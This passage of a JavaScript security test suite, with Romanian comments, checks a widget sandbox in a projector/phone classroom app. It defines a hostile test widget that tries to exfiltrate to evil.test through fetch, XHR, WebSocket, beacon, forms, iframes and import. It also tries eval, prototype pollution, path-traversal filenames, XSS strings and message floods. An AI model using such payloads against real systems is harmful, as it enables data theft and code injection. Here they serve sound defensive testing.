    for (const [i, G] of Gs.entries()) { const f = await frameOf(G); await f.fill('#nt-ta', 'nota ' + i); await f.click('text=Add note'); }
    for (const P of [H].concat(Gs)) await untilIn(P, () => document.querySelectorAll('.nt-grid li').length === 3, null, 'toate cele 3 note');
    const names = await H.page.$$eval('.pf-pn', (l) => l.map((e) => e.textContent.trim())); eq(names.join('|'), 'Ana|Bogdan|Cora');
    noErr([H].concat(Gs));
  });
}

/* ===================== C. apărare: widget ostil, abuz pe port, telefon ostil, proiector ostil ===================== */
const EVIL_JS = String.raw`
export const strings = { en: { title: 'Evil' } };
var PORT = null;
window.addEventListener('message', function (e) { if (e.ports && e.ports[0] && !PORT) PORT = e.ports[0]; });   // un widget ostil poate sta la ascultare și pe portul privat
var OUT = {};
function rec(k, v) { OUT[k] = v; try { document.getElementById('out').textContent = JSON.stringify(OUT); } catch (e) { /* ignorat */ } }
function tryit(k, fn) { try { var r = fn(); if (r && typeof r.then === 'function') { var done = false; r.then(function (v) { done = true; rec(k, 'ALLOWED:' + String(v).slice(0, 40)); }, function (e) { done = true; rec(k, 'blocked:' + (e && e.name || e)); }); setTimeout(function () { if (!done) rec(k, 'blocked:timeout'); }, 3000); } else rec(k, r); } catch (e) { rec(k, 'blocked:' + (e && e.name || e)); } }
export function mount(box, api) {
  var out = document.createElement('pre'); out.id = 'out'; box.appendChild(out);
  var go = document.createElement('button'); go.id = 'go'; go.textContent = 'go'; box.appendChild(go);
  var flood = document.createElement('button'); flood.id = 'flood'; flood.textContent = 'flood'; box.appendChild(flood);
  var nav = document.createElement('button'); nav.id = 'nav'; nav.textContent = 'nav'; box.appendChild(nav);
  var got = 0, lastState = null; api.on('state', function (s) { got++; lastState = s; rec('state_seen', got + ':' + JSON.stringify(s).slice(0, 40)); });
  api.on(function (d) { if (d && d.hello) rec('msg_from_peer', JSON.stringify(d).slice(0, 60)); });
  go.addEventListener('click', function () {
    tryit('parent_doc', function () { return window.parent.document.title ? 'ACCESS' : 'ACCESS-empty'; });
    tryit('top_nav', function () { window.top.location.href = 'https://evil.test/top'; return 'attempted'; });
    tryit('localStorage', function () { return 'ACCESS:' + localStorage.length; });
    tryit('sessionStorage', function () { return 'ACCESS:' + sessionStorage.length; });
    tryit('cookie', function () { document.cookie = 'a=b'; return 'ACCESS:' + document.cookie; });
    tryit('indexedDB', function () { return indexedDB.open('x') ? 'ACCESS' : 'none'; });
    tryit('fetch', function () { return fetch('https://evil.test/fetch'); });
    tryit('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr'); x.send(); return 'sent'; });
    tryit('websocket', function () { var w = new WebSocket('wss://evil.test/ws'); return 'opened'; });
    tryit('beacon', function () { return navigator.sendBeacon('https://evil.test/b', 'x') ? 'ACCESS-sent' : 'refused'; });
    tryit('image', function () { var i = new Image(); i.src = 'https://evil.test/pixel.png'; document.body.appendChild(i); return 'attempted'; });
    tryit('eval', function () { return eval('1+1'); });
    tryit('Function', function () { return new Function('return 2')(); });
    tryit('setTimeout-string', function () { setTimeout('window.__pwn=1', 0); return 'attempted'; });
    tryit('inline-handler', function () { document.body.insertAdjacentHTML('beforeend', '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__pwn2=1">'); return 'attempted'; });
    tryit('script-inject', function () { var s = document.createElement('script'); s.textContent = 'window.__pwn3=1'; document.head.appendChild(s); return 'attempted'; });
    tryit('form-submit', function () { var f = document.createElement('form'); f.action = 'https://evil.test/form'; f.method = 'post'; document.body.appendChild(f); f.submit(); return 'attempted'; });
    tryit('iframe', function () { var i = document.createElement('iframe'); i.src = 'https://evil.test/frame'; document.body.appendChild(i); return 'attempted'; });
    tryit('window.open', function () { var w = window.open('https://evil.test/popup'); return w ? 'ACCESS-popup' : 'null'; });
    tryit('worker', function () { return new Promise(function (res, rej) { var w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)']))); w.onmessage = function () { res('ran'); }; w.onerror = function () { rej(new Error('error')); }; }); });
    tryit('import', function () { return import('https://evil.test/m.js'); });
    tryit('camera', function () { return navigator.mediaDevices.getUserMedia({video: true}); });
    tryit('geolocation', function () { return new Promise(function (res, rej) { navigator.geolocation.getCurrentPosition(res, function (e) { rej(new Error('denied')); }); }); });
    tryit('clipboard', function () { return navigator.clipboard.readText(); });
    tryit('prototype', function () { return ({}).polluted === undefined ? 'clean' : 'POLLUTED'; });
  });
  nav.addEventListener('click', function () { tryit('self-navigation', function () { location.href = 'https://evil.test/self'; return 'attempted'; }); });
  flood.addEventListener('click', function () {
    var P = PORT; if (!P) { rec('flood', 'no-port'); return; }
    var j = JSON.stringify({ hello: 1 }), big = JSON.stringify({ x: new Array(60000).join('z') });
    for (var i = 0; i < 3000; i++) P.postMessage({ t: 'send', j: j, to: 'all' });                 // inundație de mesaje către toți
    for (i = 0; i < 3000; i++) P.postMessage({ t: 'state', j: JSON.stringify({ n: i }) });          // inundație de stare: ultima valoare trebuie să ajungă, dar nu 3000 de difuzări
    for (i = 0; i < 3000; i++) P.postMessage({ t: 'err', m: 'x' });                                 // inundație de erori: o singură notificare
    for (i = 0; i < 3000; i++) P.postMessage({ t: 'store', id: i, op: 'set', k: 'k' + (i % 7), j: JSON.stringify(i) });
    for (i = 0; i < 50; i++) P.postMessage({ t: 'save', name: 'f' + i + '.csv', mime: 'text/csv', data: 'a,b\n=1+1,x\n' });
    for (i = 0; i < 2000; i++) { P.postMessage({ t: 'mounted' }); P.postMessage({ t: 'ready' }); }
    P.postMessage({ t: 'send', j: big, to: 'all' });                                               // prea mare
    P.postMessage({ t: 'send', j: j, to: '__proto__' }); P.postMessage({ t: 'send', j: j, to: 'constructor' }); P.postMessage({ t: 'send', j: 5, to: 'all' }); P.postMessage({ t: 'send', j: j, to: { a: 1 } });
    P.postMessage({ t: 'state', j: big }); P.postMessage({ t: 'state', j: '{bad' }); P.postMessage({ t: 'zzz' }); P.postMessage(null); P.postMessage('x'); P.postMessage({ t: 5 });
    P.postMessage({ t: 'save', name: '../../x.html', mime: 'text/html', data: '<scr' + 'ipt>1</scr' + 'ipt>' });                    // asamblat la rulare (constructorul refuză un widget care conține acest marcaj direct în sursă)
    P.postMessage({ t: 'save', name: 'x.png', mime: 'image/png', data: 'data:image/svg+xml;base64,AAAA' });
    P.postMessage({ t: 'store', id: 99999, op: 'set', k: '../../x', j: '1' }); P.postMessage({ t: 'store', id: 99998, op: 'set', k: 'a', j: 'x'.repeat(40000) });
    P.postMessage({ t: 'send', j: JSON.stringify({ hello: 'last' }), to: 'all' });
    P.postMessage({ t: 'state', j: JSON.stringify({ final: true }) });
    rec('flood', 'done');
  });
}`;
const evilDescriptor = (id, perms) => ({id, name: 'Evil ' + id, version: '0.0.1', entry: 'widgets/' + id + '/index.js', permissions: perms, description: 'Hostile test widget.',
  i18n: Object.fromEntries(LANGS.map((l) => [l, {name: 'Evil ' + id, description: 'Hostile test widget.'}]))});

/** Jurnal al clicurilor și al refacerii barei (diagnostic: un clic poate fi înghițit dacă bara se reface între apăsare și eliberare). */
const CLICKLOG = () => {
  window.__ck = [];
  const nm = (e) => { const b = e.target && e.target.closest ? e.target.closest('[data-fid]') : null; return b ? b.getAttribute('data-fid') : (e.target && e.target.tagName); };
  for (const ev of ['pointerdown', 'mousedown', 'mouseup', 'click']) document.addEventListener(ev, (e) => window.__ck.push(Math.round(performance.now()) + ' ' + ev + ' ' + nm(e)), true);
  new MutationObserver((ms) => { for (const m of ms) { const c = m.target && m.target.classList; if (c && (c.contains('pf-bar') || c.contains('pf-acts-bar'))) { window.__ck.push(Math.round(performance.now()) + ' bara-refăcută'); break; } } }).observe(document, {childList: true, subtree: true});
};

/** Pe gazdă: numără scrierile în stocare făcute în numele widgeturilor (cheile pfs.w.*) și păstrează textele notificărilor afișate. */
const SPY = () => {
  window.__setItem = 0; window.__toasts = [];
  const o = Storage.prototype.setItem;
  Storage.prototype.setItem = function (k, v) { if (String(k).indexOf('pfs.w.') === 0) window.__setItem++; return o.call(this, k, v); };
  new MutationObserver(() => { const t = document.querySelector('.pf-toast'); if (t && t.textContent) window.__toasts.push(t.textContent); }).observe(document, {subtree: true, childList: true, characterData: true});
};

let EVIL_APP = null;
/** Copie a aplicației cu doi widgeți ostili (unul fără permisiuni, unul cu toate), asamblată cu conductele reale (builder + kit). */
function buildEvilApp() {
  if (EVIL_APP) return EVIL_APP;
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pf-evil-'));
  for (const e of fs.readdirSync(APP)) if (e !== '.git' && e !== 'node_modules') fs.cpSync(path.join(APP, e), path.join(tmp, e), {recursive: true});
  for (const [id, perms] of [['evil-none', ['none']], ['evil-all', ['drawing', 'storage', 'download']]]) {
    fs.mkdirSync(path.join(tmp, 'widgets', id), {recursive: true});
    fs.writeFileSync(path.join(tmp, 'widgets', id, 'index.js'), EVIL_JS);
    fs.writeFileSync(path.join(tmp, 'data', 'widgets', id + '.json'), JSON.stringify(evilDescriptor(id, perms), null, 2));
  }
  const KIT = path.join(HUB, 'fff-kit'), run = (...a) => { const r = spawnSync(process.execPath, a, {cwd: tmp, encoding: 'utf8'}); if (r.status !== 0) throw new Error(a.join(' ') + ' → ' + (r.stdout + r.stderr).slice(0, 400)); };
  run('scripts/build.mjs', '--kit', KIT);
  run(path.join(KIT, 'build.mjs'), 'release', tmp, '--bump', 'none', '--no-tests', '--no-readme', '--add-modules', 'qr,p2p,dialog');
  run('scripts/build.mjs', '--kit', KIT);
  run(path.join(KIT, 'build.mjs'), 'info', tmp);
  EVIL_APP = path.join(tmp, 'index.html');
  return EVIL_APP;
}

async function partC() {
  await T('C0 · constructorul refuză un widget care ar putea ieși din blocul sandbox («</script», «<!--», «<script»)', async () => {
    for (const [why, src] of [['închidere de script', "export function mount(b){ b.textContent = 'x'; }\n// </scr" + "ipt><scr" + "ipt>window.__pwn=1</scr" + "ipt>"], ['comentariu HTML', "export function mount(b){ var s = '<!-' + '-'; }\n/* <!-" + "- */"]]) {
      const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pf-guard-'));
      try {
        for (const e of fs.readdirSync(APP)) if (e !== '.git' && e !== 'node_modules') fs.cpSync(path.join(APP, e), path.join(tmp, e), {recursive: true});
        fs.mkdirSync(path.join(tmp, 'widgets', 'guard'), {recursive: true});
        fs.writeFileSync(path.join(tmp, 'widgets', 'guard', 'index.js'), src);
        fs.writeFileSync(path.join(tmp, 'data', 'widgets', 'guard.json'), JSON.stringify(evilDescriptor('guard', ['none'])));
        const r = spawnSync(process.execPath, ['scripts/build.mjs', '--kit', path.join(HUB, 'fff-kit')], {cwd: tmp, encoding: 'utf8'});
        ok(r.status !== 0, why + ': constructorul a acceptat widgetul');
        ok(/nepermis într-un bloc sandbox/.test(r.stdout + r.stderr), why + ': mesaj neașteptat: ' + (r.stdout + r.stderr).slice(0, 200));
      } finally { fs.rmSync(tmp, {recursive: true, force: true}); }
    }
  });

  await T('C1 · widget ostil fără permisiuni: nimic nu iese din sandbox (părinte, stocare, cookie, rețea, evaluare, navigare, ferestre, medii)', async () => {
    const file = buildEvilApp();
    const {H, Gs} = await session(1, {host: {file}, guest: {file}});
    await openAct(H, Gs, 'evil-none');
    const before = await H.page.evaluate(() => ({url: location.href, keys: Object.keys(localStorage).sort().join(), title: document.title}));
    const hf = await frameOf(H); await hf.click('#go');
    const readOut = async () => { const f = await frameOf(H); if (!f) return null; try { return JSON.parse(await f.evaluate(() => document.getElementById('out').textContent)); } catch (e) { return null; } };
    let r = null; const t0 = Date.now();
    while (Date.now() - t0 < 15000) { r = await readOut(); if (r && Object.keys(r).length >= 25) break; await sleep(150); }
    ok(r && Object.keys(r).length >= 25, 'sondele nu s-au terminat; rezultate: ' + JSON.stringify(r));
    await sleep(1200);                                                                        // promisiuni lente și eventuale efecte întârziate
    r = await readOut();
    if (process.env.DEBUG_PF) console.log(JSON.stringify(r, null, 1), '\nERORI:\n' + H.errors.join('\n'), '\nRETEA:', H.net);
    // sendBeacon întoarce «true» când cererea a fost doar pusă în coadă (așa cere specificația); blocarea reală e la nivelul rețelei și se dovedește prin încălcarea CSP raportată și prin lipsa oricărei cereri
    const bad = Object.entries(r).filter(([k, v]) => k !== 'beacon' && /^ALLOWED|ACCESS|POLLUTED/.test(String(v)));
    ok(bad.length === 0, 'au reușit: ' + JSON.stringify(bad));
    // dovada pozitivă: pentru fiecare canal de scurgere, browserul a raportat blocarea (CSP sau sandbox), nu doar că nu a fost observată nicio cerere
    const blocked = [[/Connecting to 'https:\/\/evil\.test\/fetch'.*blocked/, 'fetch'], [/Connecting to 'https:\/\/evil\.test\/xhr'.*blocked/, 'XMLHttpRequest'], [/Connecting to 'wss:\/\/evil\.test\/ws'.*blocked/, 'WebSocket'],
      [/Connecting to 'https:\/\/evil\.test\/b'.*blocked/, 'sendBeacon'], [/Loading the script 'https:\/\/evil\.test\/m\.js'/, 'import()'], [/Loading the image 'https:\/\/evil\.test\/pixel\.png'/, 'imagine externă'],
      [/Framing 'https:\/\/evil\.test\/'/, 'iframe extern'], [/Blocked form submission to 'https:\/\/evil\.test\/form'/, 'formular'], [/Blocked opening 'https:\/\/evil\.test\/popup'/, 'fereastră nouă'],
      [/Creating a worker from 'blob:/, 'worker'], [/Evaluating a string as JavaScript/, 'eval / Function / setTimeout(șir)'], [/Executing inline script violates/, 'script/handler inline'],
      [/allow-top-navigation/, 'navigare a ferestrei de sus'], [/Permissions policy violation: camera/, 'cameră'], [/Permissions policy violation: Geolocation/, 'localizare'], [/Permissions policy violation: The Clipboard/, 'clipboard']];
    const missing = blocked.filter(([re]) => !H.errors.some((e) => re.test(e))).map((x) => x[1]);
    ok(missing.length === 0, 'blocări neraportate de browser (canale posibil deschise): ' + missing.join(', '));
    for (const k of ['parent_doc', 'top_nav', 'localStorage', 'sessionStorage', 'cookie', 'indexedDB', 'eval', 'Function', 'worker']) ok(/^blocked:/.test(r[k]), k + ' → ' + r[k]);
    for (const k of ['fetch', 'import', 'camera', 'geolocation', 'clipboard']) ok(/^blocked:/.test(r[k]), k + ' → ' + r[k]);
    const flags = await (await frameOf(H)).evaluate(() => [window.__pwn, window.__pwn2, window.__pwn3].join());
    eq(flags, ',,', 'cod inline executat (setTimeout șir / handler / script injectat)');
    const after = await H.page.evaluate(() => ({url: location.href, keys: Object.keys(localStorage).sort().join(), title: document.title}));
    eq(after.url, before.url, 'pagina-gazdă a fost navigată'); eq(after.keys, before.keys, 'stocarea paginii-gazdă a fost atinsă'); eq(after.title, before.title);
    ok(H.page.url() === before.url && Gs[0].page.url() === 'file://' + file, 'URL-uri');
    ok(H.net.length === 0 && Gs[0].net.length === 0, 'cereri de rețea ieșite din sandbox: ' + H.net.concat(Gs[0].net).join(', '));
    ok(!(H.errors.some((e) => /pageerror/.test(e))), 'excepție în pagina-gazdă: ' + H.errors.join(' | '));
    const frameInfo = () => { const kids = H.page.mainFrame().childFrames(); return {n: kids.length, own: kids.map((f) => f.url()), nested: [].concat(...kids.map((f) => f.childFrames().map((x) => x.url())))}; };
    let fi = frameInfo();
    ok(fi.n === 1 && fi.own.every((u) => u === 'about:srcdoc' || u === ''), 'cadre sub pagina-gazdă: ' + JSON.stringify(fi));      // un singur cadru (al widgetului), încă pe documentul său inline
    ok(fi.nested.every((u) => /^chrome-error:\/\//.test(u) || u === 'about:blank'), 'cadrul creat de widget a încărcat ceva real: ' + JSON.stringify(fi.nested));    // iframe-ul extern creat de widget rămâne pagină de eroare
    // navigarea propriului cadru către un URL extern ar fi un canal de scurgere (date în URL). CSP-ul paginii-gazdă (default-src 'none' → frame-src) o blochează înainte să plece vreo cerere;
    // Chrome înlocuiește apoi cadrul cu propria pagină de eroare (widgetul își strică doar propriul ecran, nimic nu iese)
    const framing = () => H.errors.filter((e) => /Framing 'https:\/\/evil\.test\/' violates/.test(e)).length;
    const f0 = framing();
    await (await frameOf(H)).click('#nav'); await sleep(2000);
    ok(framing() > f0, 'navigarea propriului cadru către un URL extern nu a fost raportată ca blocată de CSP-ul paginii-gazdă');
    fi = frameInfo(); ok(fi.n === 1 && fi.own.every((u) => !/^(https?|wss?|ftp):/i.test(u)), 'cadrul widgetului a ajuns pe un URL extern: ' + JSON.stringify(fi));
    ok(H.net.length === 0 && Gs[0].net.length === 0, 'cerere de rețea după navigarea cadrului: ' + H.net.join(', '));
    eq(await H.page.evaluate(() => location.href), before.url, 'pagina-gazdă a fost navigată');
    // gazda își revine: se poate trece la altă activitate
    await H.page.click('[data-fid=a-timer]'); await untilIn(H, () => !!document.getElementById('tm-m'), null, 'cronometrul se deschide după ce widgetul și-a distrus cadrul');
  });

  await T('C2 · widget ostil cu toate permisiunile: inundații și mesaje rele pe port sunt limitate; ultima stare ajunge; gazda și telefonul rămân vii', async () => {
    const file = buildEvilApp();
    const {H, Gs} = await session(2, {host: {file, init: {fn: SPY, arg: null}}, guest: {file}});
    await openAct(H, Gs, 'evil-all');
    const downloads = [], dlObjs = []; H.page.on('download', (d) => { downloads.push(d.suggestedFilename()); dlObjs.push(d); });
    const t0 = Date.now(); const hf = await frameOf(H); await hf.click('#flood');
    await untilIn(H, () => /"flood":"done"/.test(document.getElementById('out').textContent), null, 'inundația s-a terminat');
    ok(await Promise.race([H.page.evaluate(() => 1), sleep(5000).then(() => 0)]), 'gazda nu mai răspunde după inundație');
    // ultima stare trimisă trebuie să ajungă la telefoane, deși au fost 3000 de actualizări
    for (const G of Gs) await untilIn(G, () => { try { return /"final":true/.test(JSON.parse(document.getElementById('out').textContent).state_seen); } catch (e) { return false; } }, null, 'ultima stare nu a ajuns la telefon', 10000);
    const g = await Promise.all(Gs.map(async (G) => JSON.parse(await (await frameOf(G)).evaluate(() => document.getElementById('out').textContent))));
    const elapsed = (Date.now() - t0) / 1000;
    for (const x of g) { const n = +String(x.state_seen).split(':')[0]; ok(n <= Math.ceil(elapsed * 10) + 8, 'prea multe difuzări de stare primite de telefon: ' + n + ' în ' + elapsed.toFixed(1) + ' s'); }
    // stocare: cel mult rate-limit-ul (40 rafală + 20/s), nu 3000
    const sets = await H.page.evaluate(() => window.__setItem); ok(sets >= 1 && sets <= 40 + Math.ceil(elapsed * 20) + 5, 'operații de stocare efectuate (cel puțin una — calea permisă merge —, cel mult limita): ' + sets);
    const keys = await H.page.evaluate(() => Object.keys(localStorage).filter((k) => k.indexOf('pfs.w.') === 0));
    ok(keys.length >= 1 && keys.every((k) => /^pfs\.w\.evil-all\.k[0-6]$/.test(k)), 'chei neașteptate în stocare: ' + keys.join(', '));
    // notificări de eroare: cel mult una la 5 s
    const toasts = (await H.page.evaluate(() => window.__toasts)).filter((x) => /Evil evil-all/.test(x)); ok(toasts.length >= 1 && toasts.length <= 1 + Math.ceil(elapsed / 5), 'notificări de eroare ale widgetului: ' + toasts.length + ' în ' + elapsed.toFixed(1) + ' s');
    // descărcări: cel mult una la 2 s, doar CSV (cele cu tip text/html sau SVG sunt respinse)
    await sleep(500); ok(downloads.length >= 1 && downloads.length <= 1 + Math.ceil(elapsed / 2), 'descărcări (50 cerute): ' + downloads.length); ok(downloads.every((n) => /\.csv$/.test(n)), 'tip nepermis: ' + downloads.join(', '));
    const body = fs.readFileSync(await dlObjs[0].path(), 'utf8'); ok(/(^|\n)'=1\+1,x/.test(body), 'celulă-formulă neneutralizată în fișierul descărcat: ' + JSON.stringify(body));
    ok(!downloads.some((n) => /html|svg|\.\./.test(n)), 'nume de fișier primejdios: ' + downloads.join(', '));
    ok(!H.errors.some((e) => /pageerror/.test(e)) && !Gs.some((G) => G.errors.some((e) => /pageerror/.test(e))), 'excepții: ' + [].concat(H.errors, ...Gs.map((G) => G.errors)).join(' | '));
    ok(H.net.length === 0 && Gs.every((G) => G.net.length === 0), 'rețea');
    // după inundație, widgetul se închide curat și proiectorul poate trece la altă activitate
    await H.page.click('[data-fid=a-timer]'); await untilIn(H, () => !!document.getElementById('tm-m'), null, 'cronometrul se deschide după inundație');
  });

  await T('C3 · widget ostil fără permisiuni: salvare, stocare și desen cerute pe port sunt refuzate (nicio descărcare, nicio scriere în stocare)', async () => {
    const file = buildEvilApp();
    const {H, Gs} = await session(1, {host: {file, init: {fn: SPY, arg: null}}, guest: {file}});
    await openAct(H, Gs, 'evil-none');
    const downloads = []; H.page.on('download', (d) => downloads.push(d.suggestedFilename()));
    const hf = await frameOf(H); await hf.click('#flood');
    await untilIn(H, () => /"flood":"done"/.test(document.getElementById('out').textContent), null, 'inundația s-a terminat');
    await sleep(1500);
    eq(downloads.length, 0, 'descărcare fără permisiune: ' + downloads.join(', '));
    eq(await H.page.evaluate(() => window.__setItem), 0, 'scriere în stocare fără permisiune');
    ok(H.net.length === 0, 'rețea');
    ok(!H.errors.some((e) => /pageerror/.test(e)), H.errors.join(' | '));
  });
}

/* ===================== D. telefon ostil și proiector ostil prin canalul de date ===================== */
const HOOK = () => {   // reține canalele de date (și ultimul «open» primit) ca să se poată trimite cadre brute valide, în afara aplicației, pe același canal
  window.__dcs = []; window.__open = null;
  const keep = (c) => {
    window.__dcs.push(c);
    c.addEventListener('message', (e) => { try { const o = JSON.parse(e.data); if (o && o.t === 'open') window.__open = o; } catch (x) { /* ignorat */ } });
    const send = c.send; c.send = function (d) { try { const o = JSON.parse(d); if (o && o.t === 'open') window.__open = o; } catch (x) { /* ignorat */ } return send.apply(this, arguments); };   // mesajele «open» trimise de gazdă
  };
  const orig = RTCPeerConnection.prototype.createDataChannel;
  RTCPeerConnection.prototype.createDataChannel = function () { const c = orig.apply(this, arguments); keep(c); return c; };
  const add = RTCPeerConnection.prototype.addEventListener;
  RTCPeerConnection.prototype.addEventListener = function (t, f, o) { if (t === 'datachannel') { const g = f; f = function (e) { keep(e.channel); return g.apply(this, arguments); }; } return add.call(this, t, f, o); };
  const desc = Object.getOwnPropertyDescriptor(RTCPeerConnection.prototype, 'ondatachannel');
  if (desc && desc.set) Object.defineProperty(RTCPeerConnection.prototype, 'ondatachannel', { set(f) { desc.set.call(this, f && ((e) => { keep(e.channel); return f.call(this, e); })); }, get: desc.get, configurable: true });
};
const rawSend = (p, frames) => p.evaluate((fr) => { const c = (window.__dcs || []).find((x) => x.readyState === 'open'); if (!c) return -1; let n = 0; for (const f of fr) { try { c.send(typeof f === 'string' ? f : JSON.stringify(f)); n++; } catch (e) { /* ignorat */ } } return n; }, frames);

async function partD() {
  await T('D1 · telefon ostil: cadre brute (rele sau valide dar ostile) nu strică proiectorul, sunt limitate și rămân text; ceilalți rămân conectați', async () => {
    const H = await start(); await H.page.click('#pf-start-host'); await H.page.waitForSelector('.pf-live');
    const G = await start({w: 390, h: 780, init: {fn: HOOK, arg: null}}); await pair(H, G, 'Ostil');
    const G2 = await start({w: 390, h: 780}); await pair(H, G2, 'Bun');
    await openAct(H, [G, G2], 'notes');
    const open = await G.page.evaluate(() => window.__open); ok(open && open.w === 'notes' && Number.isInteger(open.n), 'nu s-a prins «open»: ' + JSON.stringify(open));
    const env = (o, extra) => Object.assign({t: 'w', w: open.w, n: open.n, to: 'host', j: JSON.stringify(o)}, extra || {});
    const HTML = '<img src=x onerror="window.__x=1"> <b>b</b>';
    // 1) dovezi pozitive, fără inundație: un nume ostil și un mesaj valid dar ostil ajung la proiector și rămân text (nume tăiat la 24 de caractere)
    ok((await rawSend(G.page, [{t: 'name', name: '<img src=x onerror=alert(1)>'.repeat(50)}, env({k: 'add', x: HTML + ' valid'})])) === 2);
    await H.page.waitForFunction(() => [...document.querySelectorAll('.pf-pn')].some((e) => /^<img src=x onerror=/.test(e.textContent)), null, {timeout: 8000});
    const nm1 = await H.page.$$eval('.pf-pn', (l) => l.map((e) => e.textContent.trim())); ok(nm1.every((n) => Array.from(n).length <= 24), 'nume peste limită: ' + nm1.join('|'));
    eq(await H.page.$$eval('.pf-live img, #pf-side img', (l) => l.length), 0, 'element HTML injectat prin nume');
    await untilIn(H, () => [...document.querySelectorAll('.nt-x')].some((e) => e.textContent.indexOf('<img src=x onerror=') === 0), null, 'mesajul valid dar ostil nu a ajuns');
    // 2) apoi cadrele rele și inundațiile
    const frames = [{t: 'zzz'}, {t: 5}, 'nu-json', '[1,2,3]', 'null', {t: 'w'}, env({k: 'add', x: 'z'}, {to: 'x'.repeat(50)}), env({k: 'add', x: 'z'}, {n: 'x'}), env({k: 'add', x: 'z'}, {w: '__proto__'}),
      {t: 'w', w: open.w, n: open.n, to: 'all', j: 'x'.repeat(20000)}, {t: 'w', w: open.w, n: open.n, to: 'host', j: '{bad'}, {t: 'w', w: open.w, n: open.n, to: 'host', j: 5},
      {t: 'hi', p: 1, name: 'x'.repeat(10000), cid: {a: 1}}, {t: 'rdy', w: {}, n: 'x'}, '{"t":"w","__proto__":{"polluted":1},"w":"' + open.w + '","n":' + open.n + ',"to":"host","j":"{}"}',
      {t: 'bye', why: 'end'}, {t: 'hello', p: 1, you: {id: 'p9', name: 'x'}, peers: []}, {t: 'roster', peers: new Array(5000).fill({id: 'p1', name: 'x'})}];
    for (let i = 0; i < 4000; i++) frames.push({t: i % 2 ? 'name' : 'rdy', name: 'n' + i, w: open.w, n: open.n});            // inundație de control
    for (let i = 0; i < 2000; i++) frames.push(env({k: 'add', x: 'inundatie ' + i}));                                         // inundație de mesaje valide
    ok((await rawSend(G.page, frames)) > 0, 'nu există canal de date de care să se agațe testul');
    await sleep(2500);
    ok(await Promise.race([H.page.evaluate(() => 1), sleep(5000).then(() => 0)]), 'proiectorul nu mai răspunde');
    eq(await H.page.evaluate(() => ({}).polluted), undefined, 'poluare de prototip pe proiector');
    const names = await H.page.$$eval('.pf-pn', (l) => l.map((e) => e.textContent.trim()));
    ok(names.includes('Bun') && names.length === 2, 'lista de telefoane: ' + names.join('|'));
    const renamed = names.find((n) => n !== 'Bun'); const k = +(/^n(\d+)$/.exec(renamed) || [])[1];
    ok(Number.isInteger(k) && k >= 1 && k <= 40, 'inundația de redenumiri nu a fost limitată (sau nu a fost procesată): numele final «' + renamed + '» (se așteaptă n<k> cu k mic, adică doar primele ~15 cadre de control au trecut)');
    ok(names.every((n) => Array.from(n).length <= 24), 'nume peste limită: ' + names.join('|'));
    const hf = await frameOf(H);
    const notes = await hf.evaluate(() => ({n: document.querySelectorAll('.nt-note').length, text: [...document.querySelectorAll('.nt-x')].map((e) => e.textContent), img: document.querySelectorAll('#root img, #root script, #root iframe, #root object, #root embed, #root [onerror], #root [onload]').length, x: window.__x, pol: ({}).polluted}));
    ok(notes.text.some((s) => s.indexOf('<img src=x onerror=') === 0), 'mesajul valid dar ostil nu a ajuns (sau nu a rămas text): ' + JSON.stringify(notes.text.slice(0, 3)));
    eq(notes.img, 0, 'element injectat în widget'); eq(notes.x, undefined); eq(notes.pol, undefined);
    ok(notes.n >= 2 && notes.n <= 80, 'inundația de 2000 de mesaje valide nu a fost limitată (sau nu a fost procesată): ' + notes.n + ' notițe');
    eq(await G2.page.evaluate(() => ({}).polluted), undefined);
    ok(await G2.page.$('.pf-live'), 'telefonul bun a fost deconectat');
    const gf = await frameOf(G2); await gf.fill('#nt-ta', 'încă merge'); await gf.click('text=Add note');
    await untilIn(H, () => /încă merge/.test(document.getElementById('root').innerText), null, 'nota telefonului bun nu a mai ajuns la proiector');
    ok(!H.errors.some((e) => /pageerror/.test(e)) && !G2.errors.some((e) => /pageerror/.test(e)), 'excepții: ' + H.errors.concat(G2.errors).join(' | '));
    ok(H.net.length === 0 && G.net.length === 0 && G2.net.length === 0, 'rețea');
  });

  await T('D2 · proiector ostil: mesaje valide dar ostile, stare ostilă, liste uriașe, id-uri uriașe și inundații nu strică telefonul și nu execută cod', async () => {
    const H = await start({init: {fn: HOOK, arg: null}}); await H.page.click('#pf-start-host'); await H.page.waitForSelector('.pf-live');
    const G = await start({w: 390, h: 780}); await pair(H, G, 'Victima');
    await openAct(H, [G], 'notes');
    const open = await H.page.evaluate(() => window.__open); ok(open && open.w === 'notes' && Number.isInteger(open.n), 'nu s-a prins «open»: ' + JSON.stringify(open));
    const w = open.w, n = open.n, env = (o, extra) => Object.assign({t: 'w', w, n, f: 'h', j: JSON.stringify(o)}, extra || {});
    const HTML = '<img src=x onerror="window.__x=1"> <scr' + 'ipt>window.__x=2</scr' + 'ipt>';
    // 1) dovadă pozitivă, fără inundație: un mesaj valid dar ostil ajunge în widget și rămâne text
    ok((await rawSend(H.page, [env({k: 'n+', n: {id: 777, by: 'p9', name: '<b>Eve</b>', c: 'url(https://evil.test/leak.png)', x: HTML}})])) === 1);
    await untilIn(G, () => [...document.querySelectorAll('.nt-x')].some((e) => e.textContent.indexOf('<img src=x onerror=') === 0), null, 'mesajul ostil nu a ajuns pe telefon');
    const inert = await (await frameOf(G)).evaluate(() => ({img: document.querySelectorAll('#root img, #root script, #root iframe, #root object, #root embed, #root [onerror], #root [onload]').length, x: window.__x})); eq(inert.img, 0, 'element injectat în widget'); eq(inert.x, undefined);
    // 2) cadre rele (valide ca plic sau nu) și inundații
    const frames = [env({k: 'n+', n: {id: 778, __proto__: {polluted: 1}, x: 'proto'}}), env({k: 'n+', n: {id: {a: 1}, x: 5}}), env({k: 'n+', n: 'x'}), env({k: 'del', id: 777}, {n: n + 1}),
      {t: 'w', w, n, f: 'x'.repeat(5000), j: '{}'}, {t: 'w', w, n, f: 'p1', j: '{bad'}, {t: 'w', w: '__proto__', n, f: 'h', j: '{}'},
      {t: 'ws', w, n, j: '{"__proto__":{"polluted":1},"notes":[{"id":"b","x":"y"}]}'}, {t: 'ws', w, n, j: 'x'.repeat(20000)},
      {t: 'roster', peers: new Array(5000).fill({id: 'p1', name: '<b>x</b>'})}, {t: 'roster', peers: 'x'}, {t: 'zzz'}, 'nu-json', null];
